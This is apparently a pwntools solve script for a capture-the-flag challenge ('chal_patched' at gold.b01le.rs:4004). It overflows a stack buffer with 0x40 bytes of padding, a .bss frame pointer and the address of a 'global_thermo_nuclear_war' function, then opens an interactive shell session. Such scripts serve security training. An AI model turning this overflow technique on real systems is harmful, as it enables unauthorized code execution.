#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./chal_patched", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc gold.b01le.rs 4004"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [elf.path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        return process(args_, env=env, *a, **kw)


env = {}
io = start()

io.sendline(b"a\na\na")
payload = flat(
    b"A" * 0x40,
    elf.bss(0xc00),
    elf.sym["global_thermo_nuclear_war"])
io.sendline(payload)

io.interactive()
